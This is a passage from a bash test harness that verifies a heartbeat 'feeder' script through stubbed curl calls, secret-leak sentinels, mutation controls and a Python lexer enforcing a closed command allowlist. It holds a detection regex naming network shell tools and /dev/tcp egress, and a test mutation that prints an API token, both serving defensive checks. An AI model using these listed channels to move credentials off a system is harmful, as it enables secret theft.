    for _tn in $TLS_NAMES; do envv+=("$_tn=/dev/null"); done
  fi
  [[ "$C_GHA" != 1 ]] || envv+=("GITHUB_ACTIONS=true")
  local -a sh=("$BASH_BIN")
  [[ "$C_XTRACE" == "1" ]] && sh=("$BASH_BIN" -x)
  if [[ "$C_NOERT" == 1 ]]; then
    env -i "${envv[@]}" "$BASH_BIN" -c 'unset EPOCHREALTIME; . "$0"' "$feeder" "$C_TARGET" >"$OUT" 2>&1
  elif [[ -n "$C_ARGS" ]]; then
    # shellcheck disable=SC2086
    env -i "${envv[@]}" "${sh[@]}" "$feeder" $C_ARGS >"$OUT" 2>&1
  else
    env -i "${envv[@]}" "${sh[@]}" "$feeder" "$C_TARGET" >"$OUT" 2>&1
  fi
  echo $?
}

markers_of() { grep -oE 'verdict=[a-z_]+' "$OUT" | cut -d= -f2 | paste -sd, - || true; }
count_calls() { # <pattern>
  { grep -cE "$1" "$CALLS" 2>/dev/null || true; } | head -1
}
count_sql() { { grep -c . "$SQLLOG" 2>/dev/null || true; } | head -1; }

# The generic invariant: exit 0 if and only if the verdict is beat or qualifying_row_heartbeat_paused.
assert_exit_zero_iff_fed() { # <rc> <verdict-token> <label>
  local good=0
  [[ "$2" == beat || "$2" == qualifying_row_heartbeat_paused ]] && good=1
  if [[ "$1" == "0" && "$good" != 1 ]] || [[ "$1" != "0" && "$good" == 1 ]]; then
    fail "INVARIANT: rc=$1 with verdict=$2 ($3) — exit 0 must mean exactly {beat, qualifying_row_heartbeat_paused}"
    return 1
  fi
  return 0
}

expect() { # <name> <rc> <verdict> [required-token]
  cases=$((cases + 1))
  local name="$1" want="$2" verdict="$3" extra="${4:-}" got ok=1 all
  got="$(run_feeder)"
  [[ -s "$OUT" ]] || { fail "$name — the feeder produced NO output; did it run?"; return; }
  all="$(cat "$OUT")"
  assert_exit_zero_iff_fed "$got" "$verdict" "$name" || return
  [[ "$got" == "$want" ]] || ok=0
  grep -qE "verdict=${verdict}( |\$)" "$OUT" || ok=0
  if [[ -n "$extra" ]] && ! grep -qF -- "$extra" "$OUT"; then
    ok=0; printf '        | missing required token: %s\n' "$extra" >&2
  fi
  local beats apis refused queries
  beats=$(( $(count_calls '^beat$') + $(count_calls '^refused argv$') ))
  apis="$(count_calls '^api$')"
  refused="$(count_calls '^refused')"
  queries="$(count_sql)"
  beat_asserts=$((beat_asserts + 1))
  if [[ "$beats" != "$C_BEATS" ]]; then ok=0; printf '        | beat calls: expected %s, saw %s\n' "$C_BEATS" "$beats" >&2; fi
  if [[ "$apis" != "$C_APIS" ]]; then ok=0; printf '        | API calls: expected %s, saw %s\n' "$C_APIS" "$apis" >&2; fi
  if [[ "$queries" != "$C_Q" ]]; then ok=0; printf '        | helper queries: expected %s, saw %s\n' "$C_Q" "$queries" >&2; fi
  if [[ "$refused" != 0 ]]; then ok=0; printf '        | the stub curl REFUSED %s call(s): %s\n' "$refused" "$(grep '^refused' "$CALLS" | paste -sd, -)" >&2; fi
  # No secret, bearer, ping URL or helper error text anywhere: stdout, stderr and every argv log.
  local s
  for s in "$TOKEN" "$HB_ID_SENTINEL" "$HB_URL" "$FAKE_CRED" "$Q_PASS" "$Q_USER" "$BAD_TOKEN_SENT" "$BAD_URL_SENT"; do
    if grep -qF -- "$s" <<<"$all" || grep -qF -- "$s" "$CALLS"; then
      ok=0; printf '        | a secret-shaped sentinel leaked into output or an argv log\n' >&2
    fi
  done
  if [[ "$C_XTRACE" != "1" && "$(grep -c 'verdict=' "$OUT" || true)" != 1 ]]; then
    ok=0; printf '        | expected exactly one verdict= line, saw %s\n' "$(grep -c 'verdict=' "$OUT" || true)" >&2
  fi
  if [[ "$C_XTRACE" != "1" ]] && grep -qiE '\bexit' <<<"$all"; then
    ok=0; printf '        | human-readable output contains the word "exit"\n' >&2
  fi
  if (( ok )); then
    pass "$name (status $got, verdict $verdict)"
  else
    fail "$name — expected status $want + verdict=$verdict, got status $got [$(markers_of)]"
    sed 's/^/        | /' "$OUT" >&2
  fi
}

# ── self-tests of the machinery ───────────────────────────────────────────────────────────────
_p0=$passes; _f0=$fails
pass "SELFTEST pass() moves its counter"
fail "SELFTEST fail() moves its counter (expected, reversed below)" 2>/dev/null
assert_exit_zero_iff_fed 0 query_failed SELFTEST 2>/dev/null
if (( passes != _p0 + 1 || fails != _f0 + 2 )); then
  echo "FATAL: the verdict helpers do not move their counters — every assertion below is unbacked." >&2
  exit 1
fi
passes=$_p0; fails=$_f0

echo "== private PATH canary =="
cases=$((cases + 1))
reset_case; _c="$(run_feeder)"
if [[ "$(PATH="$WORK/root/bin" type -P curl)" == "$WORK/root/bin/curl" ]]; then pass "canary: curl resolves inside the private PATH"
else fail "canary: curl resolves OUTSIDE the private PATH"; fi
cases=$((cases + 1))
if ! PATH="$WORK/root/bin" type -P nc >/dev/null 2>&1 && ! PATH="$WORK/root/bin" type -P wget >/dev/null 2>&1; then pass "canary: no other network client on the private PATH"
else fail "canary: nc or wget is reachable from the private PATH"; fi

echo "== verdict-owning helper controls =="
# expect() decides the verdict of every case below. Each control drives it with ONE deliberate wrong
# expectation that passes the invariant check and trips a single later check; the control requires BOTH exactly
# one failure AND that check's own diagnostic (a control that failed early would prove nothing about the checks
# after it).
ctl() { # <label> <needle> <expect args...>
  local label="$1" needle="$2" out nf np
  shift 2
  out="$(expect "$@" 2>&1)"
  nf="$(grep -c '^  FAIL:' <<<"$out" || true)"; np="$(grep -c '^  PASS:' <<<"$out" || true)"
  cases=$((cases + 1))
  if [[ "$nf" == 1 && "$np" == 0 ]] && grep -qF -- "$needle" <<<"$out"; then pass "expect() control: $label"
  else fail "expect() control: $label — expected 1 failure ($needle), saw $nf failures / $np passes"; sed 's/^/        | /' <<<"$out" >&2; fi
}
reset_case; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctl1)"; C_BEATS=1; C_APIS=1
ctl "a wrong expected status is a failure" "expected status 3 + verdict=beat, got status 0" "x" 3 beat
reset_case; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctl2)"; C_BEATS=1; C_APIS=1
ctl "a wrong expected verdict is a failure" "expected status 0 + verdict=qualifying_row_heartbeat_paused, got status 0 [beat]" "x" 0 qualifying_row_heartbeat_paused
reset_case; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctl3)"; C_BEATS=1; C_APIS=1
ctl "a missing required token is a failure" "missing required token: NO_SUCH_TOKEN" "x" 0 beat "NO_SUCH_TOKEN"
reset_case; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctl4)"; C_BEATS=0; C_APIS=1
ctl "a wrong expected beat-call count is a failure" "beat calls: expected 0, saw 1" "x" 0 beat
reset_case; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctl5)"; C_BEATS=1; C_APIS=0
ctl "a wrong expected API-call count is a failure" "API calls: expected 0, saw 1" "x" 0 beat
reset_case; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctl6)"; C_BEATS=1; C_APIS=1; C_Q=2
ctl "a wrong expected query count is a failure" "helper queries: expected 2, saw 1" "x" 0 beat

# mutate <name> <old> <new> [src]: exact-string replace that must match EXACTLY ONCE (it LANDED); prints the path.
mutate() {
  local src="${4:-$FEEDER_SRC}" out="$WORK/mut/$1.sh"
  "$PY" -I - "$src" "$out" "$2" "$3" <<'PYM' || return 3
import sys
s = open(sys.argv[1]).read()
old, new = sys.argv[3], sys.argv[4]
n = s.count(old)
if n != 1:
    sys.stderr.write("mutate: %d occurrences of the target text\n" % n)
    sys.exit(3)
open(sys.argv[2], "w").write(s.replace(old, new))
PYM
  chmod +x "$out"
  printf '%s' "$out"
}
land() { # <row> <old> <new> -> sets M (path) or fails the case
  cases=$((cases + 1))
  if M="$(mutate "$1" "$2" "$3" "${4:-$FEEDER_SRC}" 2>"$WORK/mut.err")" && ! cmp -s "$FEEDER_SRC" "$M"; then pass "mutation row $1 landed"
  else fail "mutation row $1 did NOT land (its RED would be vacuous): $(cat "$WORK/mut.err")"; M="$FEEDER_SRC"; fi
}
ctl_mutant() { # <name> <old> <new> -> sets M
  land "$1" "$2" "$3"
}
# Controls of ctl itself and of land: ctl must fail when expect() does NOT trip (a known survivor) and when it
# trips for a different reason than the one named (a known wrong reason).
ctl_drv_survivor() { reset_case; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctlx1)"; C_BEATS=1; C_APIS=1; ctl "known survivor" "NEVER_PRESENT" "x" 0 beat; }
ctl_drv_wrongreason() { reset_case; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctlx2)"; C_BEATS=1; C_APIS=1; ctl "known wrong reason" "NEEDLE_THAT_IS_NOT_PRODUCED" "x" 3 beat; }
land_drv_absent() { land CTL-LAND 'TEXT_THAT_IS_NOT_IN_THE_FEEDER_ZZ' 'x'; }
# own_ctl is itself a verdict owner: the condition that grades every control above and below it. Replacing that
# condition with `if true` would turn each of them green without a failure. own_meta runs own_ctl in a SUBSHELL
# against a driver whose behaviour is known and requires the exit status and the text own_ctl must produce: exit 1
# with its FATAL line for two failures, for a wrong needle and for a driver that fails nothing, and a clean return
# with its PASS line for exactly one failure carrying the needle. It reports through printf and exit.
own_meta() { # <label> <want-rc> <want-text> <driver-fn>
  local label="$1" want_rc="$2" want_text="$3" out rc
  shift 3
  out="$( ( own_ctl "META-SUBJECT" "NEEDLE_THE_DRIVER_MUST_CARRY" "$@" ) 2>&1 )"; rc=$?
  cases=$((cases + 1))
  if [[ "$rc" == "$want_rc" ]] && grep -qF -- "$want_text" <<<"$out"; then
    printf '  PASS: own_ctl control: %s\n' "$label"; passes=$((passes + 1))
  else
    printf 'FATAL: own_ctl control FAILED: %s (exit %s, wanted %s; wanted the text: %s)\n' "$label" "$rc" "$want_rc" "$want_text" >&2
    sed 's/^/        | /' <<<"$out" >&2
    exit 1
  fi
}
meta_drv_two() { printf '  FAIL: first NEEDLE_THE_DRIVER_MUST_CARRY\n  FAIL: second\n' >&2; }
meta_drv_none() { printf '  PASS: nothing failed\n'; }
meta_drv_needle() { printf '  FAIL: one failure that carries something else\n' >&2; }
meta_drv_good() { printf '  FAIL: exactly one, NEEDLE_THE_DRIVER_MUST_CARRY\n' >&2; }
own_meta "two failures stop the suite with the FATAL line" 1 "saw 2 failure line(s)" meta_drv_two
own_meta "a driver that fails nothing stops the suite with the FATAL line" 1 "saw 0 failure line(s) and 1 pass line(s)" meta_drv_none
own_meta "a wrong needle stops the suite with the FATAL line" 1 "verdict-owner control FAILED: META-SUBJECT" meta_drv_needle
own_meta "exactly one failure carrying the needle returns cleanly with the PASS line" 0 "PASS: verdict-owner control: META-SUBJECT" meta_drv_good
own_ctl "ctl() fails on a known survivor (the wrong expectation did not trip expect)" "expected 1 failure" ctl_drv_survivor
own_ctl "ctl() fails on a known wrong reason (expect tripped, but not with the named diagnostic)" "expected 1 failure" ctl_drv_wrongreason
own_ctl "land() fails when the edit does not land" "did NOT land" land_drv_absent
ctl_mutant ctl-leak 'marker() { # <verdict>' 'marker() { printf "%s\n" "$BETTERSTACK_API_TOKEN_READONLY"; # <verdict>'
reset_case; C_SRC="$M"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctl7)"; C_BEATS=1; C_APIS=1
ctl "a feeder that prints the token is a failure" "a secret-shaped sentinel leaked" "x" 0 beat
ctl_mutant ctl-dup 'marker() { # <verdict>' 'marker() { printf "deadman-feeder: target=x verdict=dup\n"; # <verdict>'
reset_case; C_SRC="$M"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctl8)"; C_BEATS=1; C_APIS=1
ctl "a feeder that prints two verdict lines is a failure" "expected exactly one verdict= line" "x" 0 beat
ctl_mutant ctl-exit 'marker() { # <verdict>' 'marker() { echo "will exit now"; # <verdict>'
reset_case; C_SRC="$M"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctl9)"; C_BEATS=1; C_APIS=1
ctl "a feeder that prints the word exit is a failure" 'contains the word "exit"' "x" 0 beat

# ── static checks of the feeder source ────────────────────────────────────────────────────────
# ── the closed command set (H1) ───────────────────────────────────────────────────────────────
# The old `network-client-other-than-curl` pin is a DENYLIST: it misses an absolute path (/usr/bin/wget), a quoted or
# variable-built command word ("wget", ${W}get), and every client nobody listed (gh api, dig, git ls-remote,
# python3 -I, perl -M, node -p, aws, rsync, logger -n ...). The pin below is a CLOSED SET: cmdaudit.py lexes the
# feeder (comments, strings, heredoc bodies and quoted arguments are not commands; every command position is: line
# start, after ; & && || | ( { then do else elif while until ! and inside $( ), ${ :- }, "..." and [[ ]]), and a
# command word is a violation unless it is a plain bareword in the frozen allowlist below. Indirection is banned
# outright: a quoted word, a variable-built or substitution-built word, a backtick, a process substitution, an
# unquoted heredoc that expands, a word with a slash. The one legal quoted command word is "$QUERY" (the Logs
# helper), pinned to a single use and a single assignment. bash -c, sh, eval, exec, source, env, command and xargs
# are simply not in the set. Defined function names are frozen too, so a function named like a tool cannot shadow it.
CMD_ALLOW_EXTERNAL="curl jq grep cut tr wc mktemp rm dirname"
CMD_ALLOW_BUILTIN="printf echo exit set unset trap export local read return cd pwd true ["
CMD_FUNCS="beat_once build_sql cleanup_tmp count_query def_pred diag_count elapsed_ms fmarker marker on_exit resolve_heartbeat run_query run_target select_target withhold_no_row"
CMD_ALLOW="$CMD_ALLOW_EXTERNAL $CMD_ALLOW_BUILTIN $CMD_FUNCS"
CMD_AUDIT_PY="$WORK/cmdaudit.py"
cat > "$CMD_AUDIT_PY" <<'PYAUD'
import re, sys

src = open(sys.argv[1], encoding="utf-8").read()
ALLOW = set(sys.argv[2].split())
ASSIGN = re.compile(r"[A-Za-z_][A-Za-z0-9_]*(\[[^\]]*\])?\+?=")
FDPFX = re.compile(r"[0-9]+(?=[<>])")
FUNCDEF = re.compile(r"\(\s*\)")
REDIR = re.compile(r"<<<|<<-|<<|<&|<>|<|>>|>&|>\||>")
PATHY = re.compile(r"[A-Za-z0-9_./+@%-]+")
BARE = re.compile(r"[A-Za-z0-9_.:+@%-]+|\[")
STAY = ("if", "then", "else", "elif", "while", "until", "do", "!", "{", "time")
ENDKW = ("fi", "done", "}")


class L:
    def __init__(self, s):
        self.s, self.n, self.i = s, len(s), 0
        self.words, self.funcs, self.viol, self.hd = [], [], [], []

    def v(self, cls, detail):
        self.viol.append((cls, detail))

    def eat_heredocs(self):
        for delim, dash, quoted in self.hd:
            body, closed = [], False
            while self.i < self.n:
                k = self.s.find("\n", self.i)
                k = self.n if k == -1 else k
                line = self.s[self.i:k]
                self.i = min(k + 1, self.n)
                if (line.lstrip("\t") if dash else line) == delim:
                    closed = True
                    break
                body.append(line)
            if not closed:
                self.v("parse", "unterminated-heredoc")
            if not quoted and any("$(" in b or "`" in b for b in body):
                self.v("indirect", "expansion-in-unquoted-heredoc")
        self.hd = []

    def squote(self):
        k = self.s.find("'", self.i + 1)
        if k == -1:
            self.v("parse", "unterminated-squote")
            self.i = self.n
        else:
            self.i = k + 1

    def ansic(self):  # self.s[self.i] == "'" (the quote after the dollar)
        self.i += 1
        while self.i < self.n:
            c = self.s[self.i]
            if c == "\\":
                self.i += 2
                continue
            if c == "'":
                self.i += 1
                return
            self.i += 1
        self.v("parse", "unterminated-ansic")

    def backtick(self):
        self.v("indirect", "backtick-substitution")
        k = self.i + 1
        while k < self.n and self.s[k] != "`":
            k += 2 if self.s[k] == "\\" else 1
        self.i = min(k + 1, self.n)

    def arith(self):  # at "$(("
        self.i += 3
        depth = 2
        while self.i < self.n and depth:
            if self.s.startswith("$(", self.i) and not self.s.startswith("$((", self.i):
                self.cmdsub()
                continue
            c = self.s[self.i]
            if c == "(":
                depth += 1
            elif c == ")":
                depth -= 1
            self.i += 1
        if depth:
            self.v("parse", "unterminated-arith")

    def cmdsub(self):  # at "$("
        self.i += 2
        self.parse_list(")")

    def dquote(self):
        self.i += 1
        while self.i < self.n:
            c = self.s[self.i]
            if c == "\\":
                self.i += 2
            elif c == '"':
                self.i += 1
                return
            elif self.s.startswith("$((", self.i):
                self.arith()
            elif self.s.startswith("$(", self.i):
                self.cmdsub()
            elif self.s.startswith("${", self.i):
                self.param(True)
            elif c == "`":
                self.backtick()
            else:
                self.i += 1
        self.v("parse", "unterminated-dquote")

    def param(self, in_dq):  # at "${"
        self.i += 2
        depth = 1
        while self.i < self.n:
            c = self.s[self.i]
            if c == "\\":
                self.i += 2
            elif c == "'" and not in_dq:
                self.squote()
            elif c == '"':
                self.dquote()
            elif self.s.startswith("$'", self.i) and not in_dq:
                self.i += 1
                self.ansic()
            elif self.s.startswith("$((", self.i):
                self.arith()
            elif self.s.startswith("$(", self.i):
                self.cmdsub()
            elif self.s.startswith("${", self.i):
                depth += 1
                self.i += 2
            elif c == "`":
                self.backtick()
            elif c == "}":
                depth -= 1
                self.i += 1
                if depth == 0:
                    return
            else:
                self.i += 1
        self.v("parse", "unterminated-param")

    def word(self, dbr=False):
        st = self.i
        while self.i < self.n:
            c = self.s[self.i]
            if c in " \t\n":
                break
            if not dbr and c in ";&|()<>":
                break
            if c == "\\":
                self.i += 2
            elif c == "'":
                self.squote()
            elif c == '"':
                self.dquote()
            elif self.s.startswith("$'", self.i):
                self.i += 1
                self.ansic()
            elif self.s.startswith("$((", self.i):
                self.arith()
            elif self.s.startswith("$(", self.i):
                self.cmdsub()
            elif self.s.startswith("${", self.i):
                self.param(False)
            elif c == "`":
                self.backtick()
            else:
                self.i += 1
        return self.s[st:self.i]

    def classify(self, raw):
        if raw == '"$QUERY"':
            self.words.append("$QUERY")
            return False
        if "/" in raw and PATHY.fullmatch(raw):
            self.words.append(raw)
            self.v("outside", raw)
            return False
        if not BARE.fullmatch(raw):
            self.v("indirect", raw[:70])
            return False
        self.words.append(raw)
        if raw not in ALLOW:
            self.v("outside", raw)
        return True

    def parse_list(self, closer):
        s = self.s
        cmdpos, paren, cases = True, 0, []
        dbr, case_hdr, for_hdr, for_list = False, 0, 0, False
        last_idx, last_end = None, 0
        while self.i < self.n:
            c = s[self.i]
            if c in " \t":
                self.i += 1
                continue
            if c == "\\" and s.startswith("\\\n", self.i):
                self.i += 2
                continue
            if c == "\n":
                self.i += 1
                self.eat_heredocs()
                if cases and cases[-1]:
                    cmdpos = False
                elif not dbr:
                    cmdpos, for_list, for_hdr = True, False, 0
                continue
            if c == "#":
                k = s.find("\n", self.i)
                self.i = self.n if k == -1 else k
                continue
            if not dbr:
                if s.startswith(";;", self.i):
                    self.i += 2
                    if cases:
                        cases[-1] = True
                    cmdpos = False
                    continue
                if c == ";":
                    self.i += 1
                    cmdpos, for_list, for_hdr = not (cases and cases[-1]), False, 0
                    continue
                if s.startswith("&&", self.i) or s.startswith("||", self.i):
                    self.i += 2
                    cmdpos = True
                    continue
                if c == "|":
                    self.i += 2 if s.startswith("|&", self.i) else 1
                    if not (cases and cases[-1]):
                        cmdpos = True
                    continue
                if c == "&" and not s.startswith("&>", self.i):
                    self.i += 1
                    cmdpos = True
                    continue
                if c == "(":
                    m = FUNCDEF.match(s, self.i)
                    if m and last_idx is not None and not s[last_end:self.i].strip():
                        self.funcs.append(self.words.pop(last_idx))
                        self.i = m.end()
                        cmdpos, last_idx = True, None
                        continue
                    self.i += 1
                    paren += 1
                    cmdpos = True
                    continue
                if c == ")":
                    self.i += 1
                    if cases and cases[-1]:
                        cases[-1], cmdpos = False, True
                    elif paren > 0:
                        paren, cmdpos = paren - 1, False
                    elif closer == ")":
                        return
                    else:
                        self.v("parse", "unbalanced-paren")
                    continue
                if c in "<>" or s.startswith("&>", self.i):
                    if s.startswith("<(", self.i) or s.startswith(">(", self.i):
                        self.v("indirect", "process-substitution")
                        self.i += 1
                        continue
                    if c == "&":
                        self.i += 3 if s.startswith("&>>", self.i) else 2
                        op = "&>"
                    else:
                        op = REDIR.match(s, self.i).group(0)
                        self.i += len(op)
                    while self.i < self.n and s[self.i] in " \t":
                        self.i += 1
                    if op in ("<<", "<<-"):
                        raw = self.word()
                        quoted = any(q in raw for q in "'\"\\")
                        self.hd.append((re.sub(r"['\"\\]", "", raw), op == "<<-", quoted))
                    else:
                        self.word()
                    continue
                m = FDPFX.match(s, self.i)
                if m:
                    self.i = m.end()
                    continue
            if dbr and s.startswith("]]", self.i) and (self.i + 2 >= self.n or s[self.i + 2] in " \t\n;&|()<>"):
                self.i += 2
                dbr, cmdpos = False, False
                continue
            raw = self.word(dbr)
            if raw == "":
                self.i += 1
                continue
            if dbr:
                if raw == "]]":
                    dbr, cmdpos = False, False
                continue
            if cases and cases[-1]:
                if raw == "esac":
                    cases.pop()
                    cmdpos = False
                continue
            if case_hdr == 1:
                case_hdr = 2
                continue
            if case_hdr == 2:
                if raw == "in":
                    case_hdr = 0
                    cases.append(True)
                continue
            if for_hdr == 1:
                for_hdr = 2
                continue
            if for_hdr == 2:
                if raw == "in":
                    for_list = True
                for_hdr = 0
                continue
            if for_list or not cmdpos:
                continue
            if ASSIGN.match(raw) or raw in STAY:
                continue
            if raw in ENDKW:
                cmdpos = False
                continue
            if raw == "esac":
                if cases:
                    cases.pop()
                cmdpos = False
                continue
            if raw == "for":
                for_hdr, cmdpos = 1, False
                continue
            if raw == "case":
                case_hdr, cmdpos = 1, False
                continue
            if raw == "[[":
                dbr, cmdpos = True, False
                continue
            self.classify(raw)
            last_idx, last_end = len(self.words) - 1, self.i
            cmdpos = False
        if closer == ")":
            self.v("parse", "unterminated-command-substitution")
        if dbr:
            self.v("parse", "unterminated-[[")
        if self.hd:
            self.v("parse", "unterminated-heredoc")


lx = L(src)
lx.parse_list(None)
for w in lx.words:
    print("W", w)
for f in lx.funcs:
    print("F", f)
for cls, d in lx.viol:
    print("V", cls, d)
PYAUD
command_audit() { # <file> -> W/F/V lines (command words, defined functions, violations)
  "$PY" -I "$CMD_AUDIT_PY" "$1" "$CMD_ALLOW" 2>/dev/null
}

# static_violations <file>: one line per violated pin (empty = the file satisfies every static pin). The same
# function grades the shipped feeder and the mutants, so a mutant that breaks a pin is judged by the pin itself.
strip_comments() { sed -E 's/^[[:space:]]*#.*$//' "$1"; }
fn_body() { # <file> <fn> -> the function's lines (from "fn() {" to the closing "}" at column 0)
  awk -v f="$2" '$0 == f "() {" { on = 1 } on { print } on && $0 == "}" { on = 0 }' "$1"
}
static_violations() {
  local f="$1" S
  S="$(strip_comments "$f")"
  # exit contract
  local bad
  bad="$(grep -noE "\bexit\b[[:space:]]*[^[:space:];)'\"]*" <<<"$S" | sed -E 's/[[:space:]]+$//' | grep -vE ':exit[[:space:]]+(0|3|4|64|78)$' || true)"
  [[ -z "$bad" ]] || echo "exit-token-outside-{0,3,4,64,78}"
  [[ "$(grep -vE '^[[:space:]]*$' "$f" | tail -1)" == "exit 3" ]] || echo "last-line-not-exit-3"
  grep -qxF 'trap on_exit EXIT' "$f" && [[ "$(grep -cE '(^|[;&|[:space:]])trap[[:space:]]' <<<"$S" || true)" == 1 ]] || echo "not-exactly-one-EXIT-trap"
  ! grep -qE '(^|[;&|[:space:](])(exec|kill)([[:space:]]|$)' <<<"$S" || echo "exec-or-kill"
  grep -qE '^set -uo pipefail$' "$f" && ! grep -qE '^set -e' "$f" || echo "set-flags"
  grep -qF 'REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"' "$f" && ! grep -q 'rev-parse' "$f" || echo "repo-root-not-from-BASH_SOURCE"
  # DECIDED: starts 0, set to 1 at exactly three sites (selftest, paused, beat), each directly before exit 0
  if ! [[ "$(grep -cE '^DECIDED=0$' <<<"$S" || true)" == 1 && "$(grep -cE '^[[:space:]]*DECIDED=1$' <<<"$S" || true)" == 3 \
       && "$(awk '/^[[:space:]]*DECIDED=1$/{getline n; if (n ~ /^[[:space:]]*exit 0$/) c++} END{print c+0}' <<<"$S")" == 3 ]]; then
    echo "DECIDED-sites"
  fi
  # ONE beat call site, no /fail, no sibling BEAT_MODE or fail_beat verdict, no --no-archive
  [[ "$(grep -cE "%\{http_code\}" <<<"$S" || true)" == 1 ]] || echo "beat-curl-count"
  [[ "$(grep -cE '^[[:space:]]*beat_once$' <<<"$S" || true)" == 1 && "$(grep -cE '^beat_once\(\) \{' <<<"$S" || true)" == 1 ]] || echo "beat_once-not-defined-once-called-once"
  [[ "$(grep -cE '\| curl --disable' <<<"$S" || true)" == 2 ]] || echo "curl-invocation-count"
  [[ "$(grep -cE '(^|[^[:alnum:]_])curl([[:space:]]|$)' <<<"$S" || true)" == 2 ]] || echo "bare-curl-word-count"
  ! grep -qE -- '--retry' <<<"$S" || echo "curl-retry"
  [[ "$(grep -cE -- '--max-time [0-9]+ --connect-timeout [0-9]+' <<<"$S" || true)" == 2 ]] || echo "curl-missing-max-time-or-connect-timeout"
  [[ "$(grep -cE -- "--disable --noproxy '\*'" <<<"$S" || true)" == 2 ]] || echo "curl-missing-disable-noproxy"
  [[ "$(grep -E -- '--config -' <<<"$S" | grep -c '2>/dev/null' || true)" == 2 ]] || echo "curl-stderr-not-silenced"
  grep -qF '/fail' <<<"$S" && echo "slash-fail-literal"
  grep -qE 'BEAT_MODE|fail_beat' <<<"$S" && echo "sibling-fail-arm"
  grep -qE -- '--no-archive' <<<"$S" && echo "no-archive-flag"
  # No second network client of any kind: the file may reach the network ONLY through its two declared curl sites
  # (the uptime-API read and the beat), counted above. A wget, a netcat, a /dev/tcp redirect or an interpreter
  # one-liner would be an undeclared egress path for the ping URL or a credential.
  if grep -qE '(^|[^[:alnum:]_./-])(wget|nc|ncat|netcat|socat|telnet|ssh|scp|ftp|tftp)([[:space:]]|$)|/dev/(tcp|udp)/|python[0-9.]*[[:space:]]+-[A-Za-z]*c|openssl[[:space:]]+s_client|(perl|ruby|node|php)[[:space:]]+-[A-Za-z]*[ec]' <<<"$S"; then echo "network-client-other-than-curl"; fi
  # Inside the two functions allowed to touch HB_URL, only the declared lines may mention it.
  local rb bb
  rb="$(fn_body <(printf '%s\n' "$S") resolve_heartbeat | grep -F HB_URL || true)"
  bb="$(fn_body <(printf '%s\n' "$S") beat_once | grep -F HB_URL || true)"
  if [[ "$(grep -c . <<<"$rb" || true)" != 2 ]] || grep -qvxF -e '  HB_URL="$(printf '"'%s'"' "$sel" | cut -f3-)"' -e '  if [[ ! "$HB_URL" =~ $URL_RE ]]; then' <<<"$rb"; then echo "HB_URL-use-unexpected"; fi
  if [[ "$(grep -c . <<<"$bb" || true)" != 1 ]] || grep -qvxF -e '  code="$(printf '"'url = \"%s\"\\n'"' "$HB_URL" \' <<<"$bb"; then echo "HB_URL-use-unexpected"; fi
  # The case labels of select_target are exactly TARGETS (plus the refusing default): an orphan arm outside the
  # table would be a target the workflow never runs and the table-parity pins never see.
  local lbl want
  lbl="$(fn_body <(printf '%s\n' "$S") select_target | sed -nE 's/^[[:space:]]+([A-Za-z0-9_*|-]+)\).*$/\1/p' | sort | paste -sd' ' -)"
  want="$(sed -n 's/^TARGETS="\(.*\)"$/\1/p' "$f" | head -1 | tr ' ' '\n' | { cat; echo '*'; } | sort | paste -sd' ' -)"
  [[ "$lbl" == "$want" ]] || echo "select_target-labels-differ-from-TARGETS"
  # HB_URL is read ONLY inside resolve_heartbeat (assignment + shape guard) and beat_once
  local outside
  outside="$(awk '
    /^(resolve_heartbeat|beat_once)\(\) \{$/ { skip = 1 }
    skip { if ($0 == "}") skip = 0; next }
    /HB_URL/ && $0 != "HB_URL=\"\"" { print }' <<<"$S")"
  [[ -z "$outside" ]] || echo "HB_URL-read-outside-beat_once"
  ! grep -qE '(echo|printf|marker|fmarker)[^|]*HB_URL' <<<"$(grep -vF "printf 'url = " <<<"$S")" || echo "HB_URL-printed"
  # xtrace refusal present, names the four credential variables
  grep -qF 'case "$-" in' "$f" && grep -qF 'BETTERSTACK_API_TOKEN_READONLY:+x' "$f" && grep -qF 'BETTERSTACK_QUERY_PASSWORD:+x' "$f" || echo "xtrace-refusal"
  # the target is matched by literal equality and never interpolated
  grep -qE '^\s*case "\$1" in' < <(fn_body "$f" select_target) || echo "select_target-not-a-literal-case"
  local top
  top="$(awk '
    /^[A-Za-z_][A-Za-z0-9_]*\(\) \{/ { if ($0 !~ /\}[[:space:]]*$/) skip = 1; next }
    skip { if ($0 == "}") skip = 0; next }
    /\$1|\$\{1|\$\{#1/ { print }' <<<"$S" | sed -E 's/^[[:space:]]+//')"
  [[ "$(printf '%s\n' "$top" | LC_ALL=C sort | paste -sd'|' -)" == 'if ! select_target "$1"; then|if [[ "$1" == "--selftest" ]]; then|marker "usage" "target_len=${#1}"' ]] || echo "positional-arg-interpolated"
  # The closed command set (see command_audit). A crashed audit prints nothing, which the curl-count pin turns into a
  # violation, so a vacuous audit cannot pass.
  local aud
  aud="$(command_audit "$f")" || echo "command-audit-crashed"
  ! grep -q '^V parse ' <<<"$aud" || echo "command-audit-unparsed"
  ! grep -q '^V outside ' <<<"$aud" || echo "command-word-outside-closed-set"
  ! grep -q '^V indirect ' <<<"$aud" || echo "command-word-indirect"
  [[ "$(grep '^F ' <<<"$aud" | cut -c3- | LC_ALL=C sort | paste -sd' ' -)" == "$CMD_FUNCS" ]] || echo "function-set-changed"
  [[ "$(grep -cx 'W curl' <<<"$aud" || true)" == 2 ]] || echo "curl-command-word-count"
  if ! { [[ "$(grep -cx 'W \$QUERY' <<<"$aud" || true)" == 1 ]] && [[ "$(grep -c '^QUERY=' "$f" || true)" == 1 ]] \
         && grep -qxF 'QUERY="$REPO_ROOT/scripts/betterstack-query.sh"' "$f"; }; then echo "query-command-word-unpinned"; fi
}
echo "== static: shipped feeder =="
printf '#!/usr/bin/env bash\nexit 0\nfoo; exit 1\nexit "$rc"\n' > "$WORK/scan-positive.sh"
cases=$((cases + 1))
